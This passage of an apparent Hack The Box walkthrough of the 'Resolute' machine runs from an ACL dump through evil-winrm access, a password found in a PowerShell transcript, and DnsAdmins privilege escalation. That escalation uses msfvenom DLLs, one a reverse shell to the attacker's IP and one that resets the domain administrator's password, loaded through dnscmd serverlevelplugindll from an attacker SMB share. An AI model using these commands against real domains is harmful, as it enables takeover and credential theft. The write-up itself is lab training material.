[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : Domain Admins (S-1-5-21-1392959593-3013219662-3596683436-512)
[*]   ACE[20] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : Account Operators (S-1-5-32-548)
[*]   ACE[21] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadControl (0x20000)
[*]     Trustee (SID)             : Authenticated Users (S-1-5-11)
[*]   ACE[22] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : Read (0x20094)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[23] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : Local System (S-1-5-18)
[*]   ACE[24] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : ms-DS-Key-Credential-Link (5b47d60f-6090-40b2-9f37-2a4de88f3063)
[*]     Trustee (SID)             : Key Admins (S-1-5-21-1392959593-3013219662-3596683436-526)
[*]   ACE[25] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : ms-DS-Key-Credential-Link (5b47d60f-6090-40b2-9f37-2a4de88f3063)
[*]     Trustee (SID)             : Enterprise Key Admins (S-1-5-21-1392959593-3013219662-3596683436-527)
[*]   ACE[26] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : Self
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : DS-Validated-Write-Computer (9b026da6-0d3c-465c-8bee-5199d7165cba)
[*]     Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Creator Owner (S-1-3-0)
[*]   ACE[27] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : Self
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : DS-Validated-Write-Computer (9b026da6-0d3c-465c-8bee-5199d7165cba)
[*]     Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[28] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Token-Groups (b7c69e6d-2cc7-11d2-854e-00a0c983f608)
[*]     Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Enterprise Domain Controllers (S-1-5-9)
[*]   ACE[29] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Token-Groups (b7c69e6d-2cc7-11d2-854e-00a0c983f608)
[*]     Inherited type (GUID)     : Group (bf967a9c-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Enterprise Domain Controllers (S-1-5-9)
[*]   ACE[30] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Token-Groups (b7c69e6d-2cc7-11d2-854e-00a0c983f608)
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Enterprise Domain Controllers (S-1-5-9)
[*]   ACE[31] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : ms-TPM-Tpm-Information-For-Computer (ea1b7b93-5e48-46d5-bc6c-4df4fda78a35)
[*]     Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[32] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[33] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Inherited type (GUID)     : Group (bf967a9c-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[34] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[35] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity (3f78c3e5-f79a-46bd-a0b8-9d18116ddc79)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[36] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ControlAccess, ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Private-Information (91e647de-d96f-4b70-9557-d63ff4f3ccd8)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[37] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : Enterprise Admins (S-1-5-21-1392959593-3013219662-3596683436-519)
[*]   ACE[38] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ListChildObjects (0x4)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[39] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadAndExecute (0xf01bd)
[*]     Trustee (SID)             : Administrators (S-1-5-32-544)
[*]   ACE[40] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadControl, ReadProperties, ListChildObjects (0x20014)
[*]     Trustee (SID)             : Anonymous (S-1-5-7)
(.dacledit)
```

Let's try to access with `psexec`

No luck

```
$ psexec.py  MEGABANK/melanie:'Welcome123!'@10.10.10.169
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.169.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
```

with `wmiexec`

```
$ wmiexec.py MEGABANK/melanie:'Welcome123!'@10.10.10.169
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

with `evil-winrm`

```
joshua@kaligra:~/Documents/htb/machines/Resolute$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents>

```

## User flag

```
*Evil-WinRM* PS C:\Users\melanie\Desktop> dir


    Directory: C:\Users\melanie\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/26/2024   1:52 AM             34 user.txt


*Evil-WinRM* PS C:\Users\melanie\Desktop> gc user.txt
189be0188f828ca5xxxxxxxxx
```

Powershell's history

```powershell
*Evil-WinRM* PS C:\Users\melanie\Desktop> (Get-PSReadlineOption).HistorySavePath
C:\Users\melanie\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ServerRemoteHost_history.txt
```


...nothing interesting here.



## local enumeration

```powershell
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
```


options `-force` will reveal more:

```
*Evil-WinRM* PS C:\> dir -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        9/26/2024   1:51 AM      402653184 pagefile.sys

```

```powershell
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```


let's explore content:

```powershell
*Evil-WinRM* PS C:\PSTranscripts\20191203> gc PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

We noticed password `Serv3r4Admin4cc123!` for user `ryan`

## lateral movement

```powershell
joshua@kaligra:~/Documents/htb/machines/Resolute$ evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

```powershell
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

## privilege escalation

since `ryan` is member of `DnsAdmins` group, let's see if we can abuse DNS to escalate privileges

```powershell
*Evil-WinRM* PS C:\Windows\system32> dir | findstr /si dns
d-----        9/26/2024   3:49 AM                dns
-a----        9/10/2019   8:51 PM        2120704 dns.exe
-a----        5/20/2019   9:09 PM         648368 dnsapi.dll
-a----        7/16/2016   6:13 AM          32768 dnscacheugc.exe
-a----         8/7/2019   1:55 AM         436224 dnscmd.exe <====
-a----        3/13/2019  10:53 PM          18944 dnsperf.dll
-a----        5/20/2019   8:13 PM         264704 dnsrslvr.dll
-a----        7/16/2016   6:13 AM           8704 KBDNSO.DLL
```

Let's check if this technique is working

https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/


Let's create a payload with our IP address:

```bash
joshua@kaligra:~/Documents/htb/machines/Resolute$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f dll > sugo.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
```

Let's spawn a smb server

```
joshua@kaligra:~/Documents/htb/machines/Resolute$ smbserver.py share . -smb2support -username ryan -password "Serv3r4Admin4cc123!"
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

let's try to access from target to our machine:

```powershell
*Evil-WinRM* PS C:\Windows\system32> net use \\10.10.14.12\share /u:ryan "Serv3r4Admin4cc123!"
The command completed successfully.
```


Anyway, we cannot copy file due to antivirus

```powershell
*Evil-WinRM* PS C:\Windows\system32> copy \\10.10.14.12\share\sugo.dll c:\users\desktop\ryan\
Operation did not complete successfully because the file contains a virus or potentially unwanted software.

At line:1 char:1
+ copy \\10.10.14.12\share\sugo.dll c:\users\desktop\ryan\
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-Item], IOException
    + FullyQualifiedErrorId : System.IO.IOException,Microsoft.PowerShell.Commands.CopyItemCommand

```
Spawn a netcat listener

```bash
joshua@kaligra:~$ nc -nvlp 4444
listening on [any] 4444 ...
```


Try a different way... 

```powershell
*Evil-WinRM* PS C:\Windows\system32> dnscmd.exe /config /serverlevelplugindll \\10.10.14.12\share\sugo.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

It looks like the exploit went fine...

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise

```powershell
*Evil-WinRM* PS C:\windows\system32> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll


ServerLevelPluginDll : \\10.10.14.12\share\sugo.dll
PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\
PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS
PSChildName          : Parameters
PSDrive              : HKLM
PSProvider           : Microsoft.PowerShell.Core\Registry
```

anyway, restarting `dns` service doesn't make the reverse shell...

So, we try another way: we create a malicious payload that changes Administrator's password:

```bash
msfvenom -p windows/x64/exec cmd='net user administrator Vaffanculo@123! /domain' -
f dll > sugo2.dll
```

Again, restart service:

```powershell
Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.12\share\sugo2.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

```

Now, let's try to access with Administrator

```powershell
joshua@kaligra:~/Documents/htb/machines/Resolute$ psexec.py megabank.local/administrator@10.10.10.169
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.10.10.169.....
[*] Found writable share ADMIN$
[*] Uploading file tLFNUkKJ.exe
[*] Opening SVCManager on 10.10.10.169.....
[*] Creating service TWwr on 10.10.10.169.....
[*] Starting service TWwr.....
[!] Press help for extra shell commands                                                                                                                                                      Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd c:\users\administrator\desktop
c:\Users\Administrator\Desktop> dir                                                                                                                                                           Volume in drive C has no label.
 Volume Serial Number is D1AC-5AF6

 Directory of c:\Users\Administrator\Desktop

12/04/2019  06:18 AM    <DIR>          .
12/04/2019  06:18 AM    <DIR>          ..
09/26/2024  05:28 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,475,438,080 bytes free

c:\Users\Administrator\Desktop> more root.txt                                                                                                                                                f7513bb7XXXXXXXXXXXXXXXX

```





